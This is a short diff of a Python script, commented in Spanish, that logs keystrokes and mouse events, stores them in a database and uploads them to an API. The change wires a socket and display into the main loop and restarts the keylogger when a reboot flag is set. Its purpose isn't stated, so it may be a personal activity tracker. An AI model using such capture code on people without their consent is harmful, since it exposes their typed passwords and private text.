@@ -172,7 +172,7 @@ def upload_data_to_api(dbconnection, apiconnection, tablemodel):
             print('Error al subir datos a la api')
 
 
-def loop(keylogger, apiconnection=None):
+def loop(keylogger, socket, apiconnection=None, display=None):
     # Instancio el modelo para guardar datos en la DB cada minuto.
     dbconnection = DbConnection()
 
@@ -223,6 +223,13 @@ def loop(keylogger, apiconnection=None):
 
                 sleep(10)
 
+            if keylogger.reboot:
+                keylogger = Keylogger(display=display,
+                                      has_debug=DEBUG,
+                                      mouse_enabled=MOUSE_ENABLED)
+
+                socket = Socket(keylogger, has_debug=DEBUG)
+
         except Exception as e:
             if DEBUG:
                 print('Tipo de error al leer datos:', e, e.__class__)
@@ -245,10 +252,10 @@ def main():
     apiconnection = ApiConnection()
 
     # Instancio socket pasándole el keylogger para que alcance sus datos.
-    Socket(keylogger, has_debug=DEBUG)
+    socket = Socket(keylogger, has_debug=DEBUG)
 
     # Comienza el bucle para guardar datos y subirlos a la API.
-    loop(keylogger, apiconnection)
+    loop(keylogger, socket, apiconnection, display)
 
 
 if __name__ == "__main__":
